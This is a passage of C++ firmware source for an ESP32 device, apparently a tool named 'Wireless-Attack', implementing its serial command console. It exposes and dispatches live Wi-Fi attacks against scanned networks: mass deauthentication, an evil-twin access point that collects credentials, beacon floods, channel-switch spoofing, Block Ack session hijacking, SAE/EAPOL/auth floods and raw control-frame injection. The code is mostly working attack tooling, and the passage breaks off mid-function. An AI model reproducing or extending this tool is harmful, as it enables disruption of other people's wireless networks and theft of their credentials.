#include "serial_console.h"

#include <Arduino.h>
#include <WiFi.h>
#include <ctype.h>
#include <esp_system.h>
#include <esp_wifi.h>
#include <sdkconfig.h>
#include <stdlib.h>
#include <string.h>

#include "authflood.h"
#include "csa.h"
#include "deauth.h"
#include "delba.h"
#include "eapol.h"
#include "pspoll.h"
#include "sae.h"
#include "tim.h"
#include "tx_guard.h"
#include "wnm.h"

// Auto CSA: per-round impersonation window on the announced channel.
#define CSA_AUTO_HOLD_MS 500
#include "definitions.h"
#include "evil_twin.h"

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

#if CONFIG_WIRELESS_ATTACK_LVGL_SUPPORT
#include "wireless_ui.h"
#endif

namespace {

char g_line[112];
size_t g_len = 0;
int g_scan_count = 0;

TaskHandle_t s_scan_task = nullptr;
volatile bool s_scan_busy = false;

const char* auth_name(wifi_auth_mode_t mode) {
  switch (mode) {
    case WIFI_AUTH_OPEN:
      return "OPEN";
    case WIFI_AUTH_WEP:
      return "WEP";
    case WIFI_AUTH_WPA_PSK:
      return "WPA";
    case WIFI_AUTH_WPA2_PSK:
      return "WPA2";
    case WIFI_AUTH_WPA_WPA2_PSK:
      return "WPA/WPA2";
    case WIFI_AUTH_WPA2_ENTERPRISE:
      return "WPA2-ENT";
    case WIFI_AUTH_WPA3_PSK:
      return "WPA3";
    case WIFI_AUTH_WPA2_WPA3_PSK:
      return "WPA2/WPA3";
    case WIFI_AUTH_WAPI_PSK:
      return "WAPI";
    default:
      return "UNKNOWN";
  }
}

const char* attack_mode_label() {
  if (evil_twin_mode == EVIL_TWIN_CAPTURING) return "eviltwin";
  if (evil_twin_mode == EVIL_TWIN_DEAUTHING) return "eviltwin-deauth";
  return attack_mode_name();
}

const char* capabilities() {
#if CONFIG_SOC_WIFI_SUPPORT_5G
  return "deauth,eviltwin,probe,5g,wnm,tim,eapol,pspoll,sae,authflood";
#else
  return "deauth,eviltwin,probe,wnm,tim,eapol,pspoll,sae,authflood";
#endif
}

void ui_log(const char* text) {
#if CONFIG_WIRELESS_ATTACK_LVGL_SUPPORT
  wireless_ui_log(text);
#else
  (void)text;
#endif
}

void mac_to_str(const uint8_t* mac, char* out) {
  snprintf(out, 18, "%02X:%02X:%02X:%02X:%02X:%02X", mac[0], mac[1], mac[2], mac[3], mac[4],
           mac[5]);
}

void print_help() {
  Serial.println("INFO Wireless-Attack serial console");
  Serial.println("INFO HELP                          this text");
  Serial.println("INFO PING / STATUS / STATS         liveness, counters, per-AP counters");
  Serial.println("INFO SCAN                          scan APs (async)");
  Serial.println("INFO DEAUTH <idx> [reason]         deauth one AP");
  Serial.println("INFO DEAUTH_ALL [reason]           deauth every scanned AP");
  Serial.println("INFO DEAUTH_ONLY <i,j,..> [reason] deauth only these APs");
  Serial.println("INFO DEAUTH_EXCEPT <i,j,..>        deauth every AP except these");
  Serial.println("INFO STATIONS [sec]                discover client STAs (default 6s)");
  Serial.println("INFO PROBE_BROADCAST               flood fake APs (beacon + probe response)");
  Serial.println("INFO STOP                          stop the current attack");
  Serial.println("INFO EVILTWIN <idx> / EVILTWIN_STOP / CREDS");
  Serial.println("INFO TOUCH / CALIBRATE             LVGL touch readback / recalibrate");
  Serial.println("INFO UITARGETS / UI                LVGL target popup: open / report state");
  Serial.println("INFO UISCREEN <name>               switch the LVGL screen (menu/deauth/mode/probe/csa/delba/ba/evil/wnm/tim/eapol/pspoll/sae/authflood)");
  Serial.println("INFO RXMIX                         received frame mix (beacon/probe/deauth/ctrl/data)");
  Serial.println("INFO REASON [1-65535|random]       deauth reason code: fixed, random per burst, or report");
  Serial.println("INFO CSA <idx> [ch] [cnt] [secs]   CSA spoof; no ch/auto = random opposite-band channel, loops");
  Serial.println("INFO CSASTOP                       stop the CSA spoof");
  Serial.println("INFO CSATEST                       dump the CSA action/beacon bytes (format check)");
  Serial.println("INFO DELBA <idx> [reason]          DELBA spoof: tear down Block Ack sessions (1/32/37/38/39)");
  Serial.println("INFO DELBASTOP                     stop the DELBA spoof");
  Serial.println("INFO DELBATEST                     dump the DELBA action frame bytes (format check)");
  Serial.println("INFO BAATTACK <idx> [step]         BA-session hijack: DELBA -> forged ADDBA (SSN) -> BAR loop");
  Serial.println("INFO BASTOP                        stop the BA-session hijack");
  Serial.println("INFO BATEST                        dump the forged ADDBA Request / BAR bytes");
  Serial.println("INFO BATX                          send one DELBA/ADDBA/BAR and print the driver verdict");
  Serial.println("INFO BAPLANT <idx> [step]          plant the reorder window once, then stay silent (window-hijack test)");
  Serial.println("INFO BARPUSH <idx> [step]          send only BARs (no ADDBA/DELBA), then stay silent");
  Serial.println("INFO WNM <idx> [cand|bare] [timer] [ch] [sta-mac]  802.11v BTM Request spoof (needs PMF off)");
  Serial.println("INFO WNMSTOP                       stop the BTM Request spoof");
  Serial.println("INFO WNMTEST                       dump the BTM Request bytes (format check)");
  Serial.println("INFO TIM <idx> [tim|clear] [aid]   tamper the TIM element of a cloned beacon");
  Serial.println("INFO TIMSTOP                       stop the beacon clone");
  Serial.println("INFO TIMTEST                       dump the cloned beacon (TIM check)");
  Serial.println("INFO EAPOL <idx> [tid|-1] [sta-mac] EAPOL-Start/Logoff flood as a forged station");
  Serial.println("INFO EAPOLSTOP                     stop the EAPOL flood");
  Serial.println("INFO EAPOLTEST                     dump the EAPOL data frames (format check)");
  Serial.println("INFO PSPOLL <idx> [sta-mac]        PM-bit spoof: forged PM=1 Null Data");
  Serial.println("INFO PSPOLLREL                     send PM=0 to every victim, then stop");
  Serial.println("INFO PSPOLLSTOP                    stop the PM-bit spoof");
  Serial.println("INFO PSPOLLTEST                    dump the PM=1 / PM=0 Null Data bytes");
  Serial.println("INFO SAE <idx> [point|rand] [gap_ms]  SAE Commit flood (WPA3), echoes anti-clogging token");
  Serial.println("INFO SAESTOP                       stop the SAE flood");
  Serial.println("INFO SAETEST                       dump the SAE Commit bytes (format check)");
  Serial.println("INFO AUTHFLOOD <idx> [both|auth|assoc] [noauto]  auth/assoc flood, upgrades to SAE on WPA3");
  Serial.println("INFO AUTHFLOODSTOP                 stop the auth/assoc flood");
  Serial.println("INFO AUTHFLOODTEST                 dump the forged auth/assoc bytes");
  Serial.println("INFO RESTART                       esp_restart() (recovery from an exhausted TX pool)");
  Serial.println("INFO MON <ch> <secs>               passive capture on one channel (ch=0 hops 1..13)");
  Serial.println("INFO RADIO                         dump the driver's sniffer state (promisc + both filters + channel)");
  Serial.println("INFO CTRLTEST [subtype] [broadcast|bssid] [dur]  10 control frames of that subtype (default RTS=11)");
  Serial.println("INFO CTRLFILTER [hex|all|none]     2nd-stage control-subtype filter: report or set it");
  Serial.println("INFO UIREASON / UI                 LVGL reason popup: open / report state");
}

// ------------------------------------------------------------------ parsing

int parse_index(char* token) {
  if (token == nullptr) return -1;
  char* end = nullptr;
  const long value = strtol(token, &end, 10);
  if (end == token) return -1;
  return (int)value;
}

// "AABBCCDDEEFF", "AA:BB:CC:DD:EE:FF" or "AA-BB-CC-DD-EE-FF" -> 6 bytes.
bool parse_mac(const char* token, uint8_t out[6]) {
  if (token == nullptr) return false;
  char clean[13];
  int n = 0;
  for (const char* p = token; *p != '\0' && n < 13; p++) {
    if (*p == ':' || *p == '-' || *p == '.') continue;
    if (!isxdigit((unsigned char)*p)) return false;
    clean[n++] = *p;
  }
  if (n != 12) return false;
  for (int i = 0; i < 6; i++) {
    const char byte[3] = {clean[i * 2], clean[i * 2 + 1], 0};
    out[i] = (uint8_t)strtoul(byte, nullptr, 16);
  }
  return true;
}

enum reason_kind_t { REASON_FIXED = 0, REASON_RANDOM, REASON_BAD };

struct reason_arg_t {
  reason_kind_t kind;
  uint16_t value;
};

bool token_iequals(const char* a, const char* b) {
  if (a == nullptr || b == nullptr) return false;
  while (*a != 0 && *b != 0) {
    if (tolower((unsigned char)*a) != tolower((unsigned char)*b)) return false;
    a++;
    b++;
  }
  return *a == 0 && *b == 0;
}

// Accepted: nothing (default 1), "random"/"rand"/"r", or 1..65535.
// 0 is reserved in the standard and 2 bytes is the field width, so anything
// outside 1..65535 is rejected instead of silently becoming reason 1.
reason_arg_t parse_reason_arg(char* token) {
  reason_arg_t arg = {REASON_FIXED, 1};
  if (token == nullptr) return arg;
  if (token_iequals(token, "random") || token_iequals(token, "rand") ||
      token_iequals(token, "r")) {
    arg.kind = REASON_RANDOM;
    return arg;
  }
  char* end = nullptr;
  const long value = strtol(token, &end, 10);
  if (end == token || *end != 0 || value <= 0 || value > 65535) {
    arg.kind = REASON_BAD;
    return arg;
  }
  arg.value = (uint16_t)value;
  return arg;
}

// Applies a parsed reason; false means "abort this command".
bool apply_reason_arg(const reason_arg_t& arg) {
  if (arg.kind == REASON_BAD) {
    Serial.println("ERR reason must be 1..65535, or 'random'");
    return false;
  }
  if (arg.kind == REASON_RANDOM) {
    attack_set_reason_random();
    return true;
  }
  attack_set_reason(arg.value);
  if (!attack_reason_is_defined(arg.value)) {
    Serial.printf("INFO reason %u is outside the defined set (1-11,13-24), clients may ignore it\n",
                  (unsigned)arg.value);
  }
  return true;
}

int parse_index_list(char* text, int* out, int max) {
  if (text == nullptr) return 0;
  int count = 0;
  char* cursor = text;
  while (cursor != nullptr && *cursor != 0 && count < max) {
    char* next = strchr(cursor, ',');
    if (next != nullptr) {
      *next = 0;
    }
    const int value = parse_index(cursor);
    if (value >= 0) {
      out[count++] = value;
    }
    cursor = (next == nullptr) ? nullptr : next + 1;
  }
  return count;
}

// ------------------------------------------------------------------ commands

void do_scan() {
  prepare_radio_for_scan();
#if CONFIG_WIRELESS_ATTACK_LVGL_SUPPORT
  wireless_ui_scan_begin();
#endif
  g_scan_count = WiFi.scanNetworks();
  Serial.println("SCAN_BEGIN");
  for (int i = 0; i < g_scan_count; i++) {
    Serial.printf("NET %d %d %d %s %s %s\n", i, (int)WiFi.RSSI(i), (int)WiFi.channel(i),
                  auth_name(WiFi.encryptionType(i)), WiFi.BSSIDstr(i).c_str(), WiFi.SSID(i).c_str());
#if CONFIG_WIRELESS_ATTACK_LVGL_SUPPORT
    // Keep the String objects alive until the UI has copied the text: taking
    // c_str() straight into the struct leaves dangling pointers.
    const String ui_ssid = WiFi.SSID(i);
    const String ui_bssid = WiFi.BSSIDstr(i);
    const wireless_ui_network_t net = {
        .index = (uint16_t)i,
        .rssi = (int8_t)WiFi.RSSI(i),
        .channel = (uint8_t)WiFi.channel(i),
        .auth = auth_name(WiFi.encryptionType(i)),
        .bssid = ui_bssid.c_str(),
        .ssid = ui_ssid.c_str(),
    };
    wireless_ui_add_network(&net);
#endif
  }
  Serial.printf("SCAN_END %d\n", g_scan_count);
#if CONFIG_WIRELESS_ATTACK_LVGL_SUPPORT
  wireless_ui_scan_end(g_scan_count);
#endif
}

static void scan_task(void* arg) {
  (void)arg;
  for (;;) {
    ulTaskNotifyTake(pdTRUE, portMAX_DELAY);
    do_scan();
    s_scan_busy = false;
  }
}

void start_scan() {
  if (s_scan_task == nullptr) {
    Serial.println("ERR scanner task not ready");
    return;
  }
  if (s_scan_busy) {
    Serial.println("ERR scan already running");
    return;
  }
  s_scan_busy = true;
  xTaskNotifyGive(s_scan_task);
}

void do_status() {
  int ui = 0;
#if CONFIG_WIRELESS_ATTACK_LVGL_SUPPORT
  ui = wireless_ui_ready() ? 1 : 0;
#endif
  Serial.print("STATUS mode=");
  Serial.print(attack_mode_label());
  Serial.print(" eliminated=");
  Serial.print(eliminated_stations);
  Serial.print(" deauth_frames=");
  Serial.print((unsigned)attack_deauth_frames());
  Serial.print(" probe_frames=");
  Serial.print((unsigned)attack_probe_frames());
  {
    uint8_t prim = 0;
    wifi_second_chan_t sec = WIFI_SECOND_CHAN_NONE;
    esp_wifi_get_channel(&prim, &sec);
    Serial.print(" ch=");
    Serial.print((int)prim);
  }
  Serial.print(" rx=");
  Serial.print((unsigned)attack_rx_frames());
  Serial.print(" rxm=");
  Serial.print((unsigned)attack_rx_matches());
  Serial.print(" txok=");
  Serial.print((unsigned)attack_tx_ok());
  Serial.print(" txerr=");
  Serial.print((unsigned)attack_tx_err());
  Serial.print(" txerr_nomem=");
  Serial.print((unsigned)attack_tx_err_nomem());
  Serial.print(" txerr_inval=");
  Serial.print((unsigned)attack_tx_err_invalid());
  Serial.print(" txerr_other=");
  Serial.print((unsigned)attack_tx_err_other());
  Serial.print(" txec=");
  Serial.print(attack_tx_last_err());
  Serial.print(" txdrop=");
  Serial.print((unsigned)attack_tx_dropped());
  Serial.print(" txg=");
  Serial.print((unsigned)tx_guard_throttled());
  Serial.print(" txgok=");
  Serial.print((unsigned)tx_guard_ok());
  Serial.print(" txgerr=");
  Serial.print((unsigned)tx_guard_err());
  Serial.print(" blind=");
  Serial.print((unsigned)attack_blind_frames());
  Serial.print(" rev=");
  Serial.print((unsigned)attack_reverse_frames());
  Serial.print(" csa=");
  Serial.print(csa_phase_name());
  Serial.print(" csaf=");
  Serial.print((unsigned)csa_frames());
  Serial.print(" csac=");
  Serial.print((unsigned)csa_clients());
  Serial.print(" csch=");
  Serial.print((unsigned)csa_new_channel());
  Serial.print(" csaauto=");
  Serial.print(csa_auto_channel() ? 1 : 0);
  Serial.print(" csacycle=");
  Serial.print((unsigned)csa_cycles());
  Serial.print(" csaauth=");
  Serial.print((unsigned)csa_auth_replies());
  Serial.print(" csarej=");
  Serial.print((unsigned)csa_assoc_rejects());
  Serial.print(" wnm=");
  Serial.print(wnm_mode_name());
  Serial.print(" wnmf=");
  Serial.print((unsigned)wnm_frames());
  Serial.print(" wnmc=");
  Serial.print((unsigned)wnm_capable_clients());
  Serial.print(" wnmskip=");
  Serial.print((unsigned)wnm_skipped_clients());
  Serial.print(" wnmresp=");
  Serial.print((unsigned)wnm_responses());
  Serial.print(" wnms=");
  Serial.print((unsigned)wnm_last_status());
  Serial.print(" tim=");
  Serial.print(tim_mode_name());
  Serial.print(" timf=");
  Serial.print((unsigned)tim_frames());
  Serial.print(" timaid=");
  Serial.print((unsigned)tim_aid_mask());
  Serial.print(" timreal=");
  Serial.print((unsigned)tim_real_beacons());
  Serial.print(" eap=");
  Serial.print(eapol_active() ? "on" : "off");
  Serial.print(" eapf=");
  Serial.print((unsigned)eapol_frames());
  Serial.print(" eaprx=");
  Serial.print((unsigned)eapol_rx_from_ap());
  Serial.print(" eaprxreq=");
  Serial.print((unsigned)eapol_rx_eap_packets());
  Serial.print(" eaprxsta=");
  Serial.print((unsigned)eapol_rx_from_sta());
  Serial.print(" psp=");
  Serial.print(pspoll_mode_name());
  Serial.print(" pspf=");
  Serial.print((unsigned)pspoll_frames());
  Serial.print(" pspnul=");
  Serial.print((unsigned)pspoll_null_frames());
  Serial.print(" pspfl=");
  Serial.print((unsigned)pspoll_flush_frames());
  Serial.print(" pspc=");
  Serial.print((unsigned)pspoll_clients());
  Serial.print(" pspdl=");
  Serial.print((unsigned)pspoll_dl_frames());
  Serial.print(" psprxp=");
  Serial.print((unsigned)pspoll_rx_polls());
  Serial.print(" psprxn=");
  Serial.print((unsigned)pspoll_rx_nulls());
  Serial.print(" psprxpm=");
  Serial.print((unsigned)pspoll_rx_pm1());
  Serial.print(" sae=");
  Serial.print(sae_active() ? "on" : "off");
  Serial.print(" saesec=");
  Serial.print(sae_security_name(sae_security()));
  Serial.print(" saef=");
  Serial.print((unsigned)sae_frames());
  Serial.print(" saec=");
  Serial.print((unsigned)sae_identities());
  Serial.print(" saeresp=");
  Serial.print((unsigned)sae_responses());
  Serial.print(" saecode=");
  Serial.print((unsigned)sae_last_status());
  Serial.print(" saetok=");
  Serial.print((unsigned)sae_tokens());
  Serial.print(" saeecho=");
  Serial.print((unsigned)sae_echoed());
  Serial.print(" af=");
  Serial.print(authflood_active() ? "on" : "off");
  Serial.print(" aff=");
  Serial.print((unsigned)authflood_frames());
  Serial.print(" afa=");
  Serial.print((unsigned)authflood_auth_frames());
  Serial.print(" afs=");
  Serial.print((unsigned)authflood_assoc_frames());
  Serial.print(" afids=");
  Serial.print((unsigned)authflood_identities());
  Serial.print(" afst=");
  Serial.print((unsigned)authflood_last_status());
  Serial.print(" afup=");
  Serial.print(authflood_upgraded() ? 1 : 0);
  Serial.print(" delba=");
  Serial.print(delba_active() ? "on" : "off");
  Serial.print(" delbaf=");
  Serial.print((unsigned)delba_frames());
  Serial.print(" delbac=");
  Serial.print((unsigned)delba_clients());
  Serial.print(" delbat=");
  Serial.print((unsigned)delba_tid_mask());
  Serial.print(" delbab=");
  Serial.print((unsigned)delba_addba_seen());
  Serial.print(" delbar=");
  Serial.print((unsigned)delba_bar_seen());
  Serial.print(" bamode=");
  Serial.print(delba_ba_mode() ? 1 : 0);
  Serial.print(" baaddba=");
  Serial.print((unsigned)delba_ba_addba_frames());
  Serial.print(" babar=");
  Serial.print((unsigned)delba_ba_bar_frames());
  Serial.print(" badlba=");
  Serial.print((unsigned)delba_ba_delba_frames());
  Serial.print(" bassn=");
  Serial.print((unsigned)delba_ba_last_ssn());
  Serial.print(" baerr=");
  Serial.print((unsigned)delba_ba_errors());
  Serial.print(" bae=");
  Serial.print((int)delba_ba_last_error());
  Serial.print(" baplant=");
  Serial.print((unsigned)delba_ba_planted_frames());
  Serial.print(" delbtr=");
  Serial.print((unsigned)delba_triggered());
  Serial.print(" delbb=");
  Serial.print((unsigned)delba_blind_frames());
  Serial.print(" delbrv=");
  Serial.print((unsigned)delba_reverse_frames());
  Serial.print(" rxaddba=");
  Serial.print((unsigned)attack_rx_addba());
  Serial.print(" rxdelba=");
  Serial.print((unsigned)attack_rx_delba());
  Serial.print(" reason=");
  if (attack_reason_is_random()) {
    Serial.print("random");
  } else {
    Serial.print((unsigned)attack_reason_last());
  }
  Serial.print(" rlast=");
  Serial.print((unsigned)attack_reason_last());
  Serial.print(" networks=");
  Serial.print(g_scan_count);
  Serial.print(" creds=");
  Serial.print(captured_count);
  Serial.print(" heap=");
  Serial.print((unsigned)esp_get_free_heap_size());
  Serial.print(" ui=");
  Serial.print(ui);
  Serial.print(" caps=");
  Serial.println(capabilities());
#if CONFIG_WIRELESS_ATTACK_LVGL_SUPPORT
  wireless_ui_status(attack_mode_label(), eliminated_stations, g_scan_count, captured_count,
                     attack_deauth_frames(), attack_probe_frames());
#endif
}

void do_stats() {
  const int aps = attack_ap_count();
  Serial.print("STATS_BEGIN mode=");
  Serial.print(attack_mode_label());
  Serial.print(" deauth_frames=");
  Serial.print((unsigned)attack_deauth_frames());
  Serial.print(" probe_frames=");
  Serial.print((unsigned)attack_probe_frames());
  Serial.print(" aps=");
  Serial.println(aps);
  for (int i = 0; i < aps; i++) {
    const uint8_t* bssid = nullptr;
    uint32_t frames = 0;
    uint8_t channel = 0;
    if (!attack_ap_info(i, &bssid, &frames, &channel)) {
      continue;
    }
    char mac[18];
    mac_to_str(bssid, mac);
    Serial.printf("AP %d %s ch%u frames=%u\n", i, mac, (unsigned)channel, (unsigned)frames);
  }
  Serial.println("STATS_END");
}

void do_deauth(int index, uint16_t reason) {
  if (index < 0 || index >= g_scan_count) {
    Serial.println("ERR index out of range, run SCAN first");
    return;
  }
  if (!attack_deauth_single(index, reason)) {
    Serial.println("ERR cannot start deauth on that network");
    return;
  }
  Serial.printf("OK DEAUTH %d %s\n", index, WiFi.SSID(index).c_str());
  ui_log("deauth started");
}

// CSA <idx> [new-channel|auto] [count] [hold-seconds]
// Without a channel (or with "auto") the firmware announces a channel from the
// opposite band -- 2.4 GHz AP -> random 5 GHz channel, 5 GHz AP -> random 2.4 GHz
// -- and repeats the announce+hold cycle until CSASTOP. A channel given
// explicitly keeps the old one-shot behaviour.
void do_csa(int index, long channel, long count, long hold_seconds) {
  if (index < 0 || index >= g_scan_count) {
    Serial.println("ERR index out of range, run SCAN first");
    return;
  }
  const bool auto_channel = (channel < 0);
  if (!auto_channel) {
    const bool is_2g = channel >= 1 && channel <= 14;
    const bool is_5g = channel >= 36 && channel <= 196;
    if (!is_2g && !is_5g) {
      Serial.println("ERR new channel must be 1..14 or 36..196");
      return;
    }
    if ((long)WiFi.channel(index) == channel) {
      Serial.println("ERR new channel must differ from the AP channel");
      return;
    }
  }
  if (count < 2 || count > 8) {
    Serial.println("ERR count must be 2..8 (a real AP counts down)");
    return;
  }
  if (!auto_channel && (hold_seconds < 1 || hold_seconds > 600)) {
    Serial.println("ERR hold seconds must be 1..600");
    return;
  }
  const bool loop = auto_channel;
  // Auto: 500 ms per round on the announced channel (beacons + auth ok + assoc
  // refused). A fixed channel keeps the seconds-based one-shot window.
  const uint16_t hold_ms =
      auto_channel ? (uint16_t)CSA_AUTO_HOLD_MS : (uint16_t)(hold_seconds * 1000);
  if (!csa_start(index, auto_channel ? 0 : (uint8_t)channel, (uint8_t)count, hold_ms, loop)) {
    Serial.println("ERR cannot start CSA on that network");
    return;
  }
  Serial.printf("OK CSA %d %s count=%ld hold=%ums loop=%d ssid=%s\n", index,
                auto_channel ? "auto(opposite-band)" : "fixed", count, (unsigned)hold_ms, loop ? 1 : 0,
                WiFi.SSID(index).c_str());
  ui_log("csa started");
}

// MON <channel> <seconds>: passive capture on one channel (0 = hop 1..13).
// Counters are reset on entry, so a following RXMIX describes exactly this window.
void do_monitor(char* ch_token, char* sec_token) {
  const long channel = ch_token ? strtol(ch_token, nullptr, 10) : 0;
  const long seconds = sec_token ? strtol(sec_token, nullptr, 10) : 10;
  if (channel < 0 || channel > 196) {
    Serial.println("ERR monitor channel must be 0 (hop) or 1..196");
    return;
  }
  if (seconds < 1 || seconds > 120) {
    Serial.println("ERR monitor seconds must be 1..120");
    return;
  }
  attack_stop();
  monitor_begin((uint8_t)channel, (uint16_t)seconds);
  Serial.printf("OK MON ch=%ld %lds\n", channel, seconds);
  ui_log("monitor started");
}

// Prints what the driver *thinks* its sniffer configuration is: whether
// promiscuous mode is on, the type mask (mgmt/ctrl/data), the control-subtype
// mask (documented default: none filtered) and the current channel. Diagnostic,
// so a claim like "control frames are filtered" can be checked instead of guessed.
// Injects a handful of RTS control frames. Purpose: decide whether a control
// frame that is *known* to be on air can be reported through the sniffer at all.
// If a second board's RXMIX counts them, control reception works and any zero in
// live traffic means "ACK/BA are consumed by the radio", not "filtered".
// Second-stage sniffer filter: which control subtypes are let through. The
// first stage (esp_wifi_set_promiscuous_filter) only decides whether the *class*
// control is reported; without this one the driver drops every control frame.
// Semantics of the mask are the opposite of the type mask (bits = subtypes to
// drop), so this command exists to pin it down on real hardware instead of
// trusting either reading of the header comment.
void do_ctrl_filter(char* token) {
  wifi_promiscuous_filter_t filter = {0};
  if (token == nullptr) {
    esp_wifi_get_promiscuous_ctrl_filter(&filter);
    Serial.printf("CTRLFILTER mask=0x%08X\n", (unsigned)filter.filter_mask);
    return;
  }
  uint32_t mask;
  if (strcmp(token, "all") == 0) {
    mask = WIFI_PROMIS_CTRL_FILTER_MASK_ALL;
  } else if (strcmp(token, "none") == 0) {
    mask = 0;
  } else {
    mask = (uint32_t)strtoul(token, nullptr, 0);
  }
  filter.filter_mask = mask;
  const esp_err_t err = esp_wifi_set_promiscuous_ctrl_filter(&filter);
  wifi_promiscuous_filter_t readback = {0};
  esp_wifi_get_promiscuous_ctrl_filter(&readback);
  Serial.printf("OK CTRLFILTER set=0x%08X readback=0x%08X err=%d\n", (unsigned)mask,
                (unsigned)readback.filter_mask, (int)err);
}

// Control-frame TX probe: subtype, receiver address and Duration/ID are all
// parameters, because each of them turned out to matter for whether a PS-Poll
// reaches the air (测试报告 §4.4.9). Same frame length for every variant, so only
// the field under test changes.
void do_ctrl_test(char* sub_token, char* ra_token, char* dur_token) {
  long subtype = sub_token ? strtol(sub_token, nullptr, 0) : 11;
  if (subtype < 0 || subtype > 15) {
    Serial.println("ERR usage: CTRLTEST [subtype 0-15] [broadcast|bssid] [duration]");
    return;
  }
  const bool to_bssid = token_iequals(ra_token, "bssid");
  const long dur = dur_token ? strtol(dur_token, nullptr, 0) : 0;
  if (dur < 0 || dur > 0xFFFF) {
    Serial.println("ERR duration must be 0..0xFFFF");
    return;
  }
  uint8_t rts[16];
  int sent = 0;
  for (int i = 0; i < 10; i++) {
    memset(rts, 0, sizeof(rts));
    rts[0] = (uint8_t)(0x04 | ((subtype & 0x0F) << 4));  // control frame, subtype
    rts[1] = 0x00;
    rts[2] = (uint8_t)(dur & 0xFF);
    rts[3] = (uint8_t)((dur >> 8) & 0xFF);
    if (to_bssid) {
      // needs a target: the AP of the last scan entry
      const uint8_t* bssid = g_scan_count > 0 ? WiFi.BSSID((uint8_t)0) : nullptr;
      if (bssid == nullptr) {
        Serial.println("ERR CTRLTEST bssid: run SCAN first");
        return;
      }
      memcpy(rts + 4, bssid, 6);
    } else {
      memset(rts + 4, 0xFF, 6);  // RA = broadcast
    }
    rts[10] = 0x02;  // TA = locally administered placeholder
    rts[11] = 0x00;
    rts[12] = 0x00;
    rts[13] = 0xAA;
    rts[14] = 0xBB;
    rts[15] = 0xCC;
    if (esp_wifi_80211_tx(WIFI_IF_STA, rts, sizeof(rts), false) == ESP_OK) {
      sent++;
    }
    delay(5);
  }
  Serial.printf("OK CTRLTEST subtype=%ld ra=%s dur=0x%04X sent=%d\n", subtype,
                to_bssid ? "bssid" : "broadcast", (unsigned)dur, sent);
}

void do_radio() {
  bool promisc = false;
  wifi_promiscuous_filter_t type_filter = {0};
  wifi_promiscuous_filter_t ctrl_filter = {0};
  uint8_t prim = 0;
  wifi_second_chan_t sec = WIFI_SECOND_CHAN_NONE;
  const esp_err_t e1 = esp_wifi_get_promiscuous(&promisc);
  const esp_err_t e2 = esp_wifi_get_promiscuous_filter(&type_filter);
  const esp_err_t e3 = esp_wifi_get_promiscuous_ctrl_filter(&ctrl_filter);
  esp_wifi_get_channel(&prim, &sec);
  Serial.printf("RADIO promisc=%u(%d) filter=0x%08X(%d) ctrl_filter=0x%08X(%d) ch=%u\n",
                (unsigned)(promisc ? 1 : 0), (int)e1, (unsigned)type_filter.filter_mask, (int)e2,
                (unsigned)ctrl_filter.filter_mask, (int)e3, (unsigned)prim);
}

void do_csa_test() {
  csa_selftest();
}

void do_csa_stop() {
  const uint32_t frames = csa_frames();
  csa_stop();
  Serial.printf("OK CSASTOP frames=%u\n", (unsigned)frames);
  ui_log("csa stopped");
}

// DELBA <idx> [reason]: tear down the Block Ack sessions of that BSS. Needs the
// sniffer, so a running deauth/CSA attack is stopped first (one radio, one job).
void do_delba(int index, uint16_t reason) {
  if (index < 0 || index >= g_scan_count) {
    Serial.println("ERR index out of range, run SCAN first");
    return;
  }
  if (!delba_reason_is_defined(reason)) {
    Serial.println("ERR reason must be one of 1, 32, 37, 38, 39");
    return;
  }
  attack_stop();
  if (!delba_start(index, reason)) {
    Serial.println("ERR cannot start DELBA on that network");
    return;
  }
  Serial.printf("OK DELBA %d reason=%u ch=%u ssid=%s\n", index, (unsigned)reason,
                (unsigned)WiFi.channel(index), WiFi.SSID(index).c_str());
  ui_log("delba started");
}

void do_delba_stop() {
  const uint32_t frames = delba_frames();
  delba_stop();
  Serial.printf("OK DELBASTOP frames=%u\n", (unsigned)frames);
  ui_log("delba stopped");
}

void do_delba_test() {
  delba_selftest();
}

// BAATTACK <idx> [step]: hijack the Block Ack sessions of one AP by planting its
// reorder windows. Needs the sniffer, so any running attack is stopped first.
void do_ba_attack(int index, long step) {
  if (index < 0 || index >= g_scan_count) {
    Serial.println("ERR index out of range, run SCAN first");
    return;
  }
  if (step < 0 || step > 2047) {
    Serial.println("ERR step must be 0..2047 (0..127 = control run, the window is not moved)");
    return;
  }
  attack_stop();
  if (!delba_start_ba(index, (uint16_t)step)) {
    Serial.println("ERR cannot start the BA attack on that network");
    return;
  }
  Serial.printf("OK BAATTACK %d step=%ld ch=%u ssid=%s\n", index, step,
                (unsigned)WiFi.channel(index), WiFi.SSID(index).c_str());
  ui_log("ba attack started");
}

void do_ba_stop() {
  const uint32_t delba_n = delba_ba_delba_frames();
  const uint32_t addba_n = delba_ba_addba_frames();
  const uint32_t bar_n = delba_ba_bar_frames();
  delba_stop();
  Serial.printf("OK BASTOP delba=%u addba=%u bar=%u\n", (unsigned)delba_n, (unsigned)addba_n,
                (unsigned)bar_n);
  ui_log("ba attack stopped");
}

void do_ba_test() {
  delba_ba_selftest();
}

// BAPLANT <idx> [step]: a few ADDBA frames with an SSN of our choosing, then no
// more transmission. If the peer's reorder window really moved, its QoS stream
// stays dead while we are silent.
void do_bar_push(int index, long step) {
  if (index < 0 || index >= g_scan_count) {
    Serial.println("ERR index out of range, run SCAN first");
    return;
  }
  if (step < 0 || step > 2047) {
    Serial.println("ERR step must be 0..2047 (0..127 = control run)");
    return;
  }
  attack_stop();
  if (!delba_ba_bar_once(index, (uint16_t)step)) {
    Serial.println("ERR cannot start the BAR push on that network");
    return;
  }
  Serial.printf("OK BARPUSH %d step=%ld ch=%u\n", index, step, (unsigned)WiFi.channel(index));
  ui_log("bar push started");
}

void do_ba_plant(int index, long step) {
  if (index < 0 || index >= g_scan_count) {
    Serial.println("ERR index out of range, run SCAN first");
    return;
  }
  if (step < 0 || step > 2047) {
    Serial.println("ERR step must be 0..2047 (0..127 = control run)");
    return;
  }
  attack_stop();
  if (!delba_ba_plant_once(index, (uint16_t)step)) {
    Serial.println("ERR cannot start the BA plant on that network");
    return;
  }
  Serial.printf("OK BAPLANT %d step=%ld ch=%u\n", index, step, (unsigned)WiFi.channel(index));
  ui_log("ba plant started");
}

void do_ba_tx() {
  static const uint8_t probe_mac[6] = {0x02, 0xAA, 0xBB, 0xCC, 0xDD, 0xEE};
  delba_ba_tx_probe(probe_mac);
}

// ---- 802.11v BTM Request ----
void do_wnm(int index, char* mode_token, char* timer_token, char* ch_token, char* mac_token) {
  if (index < 0 || index >= g_scan_count) {
    Serial.println("ERR index out of range, run SCAN first");
    return;
  }
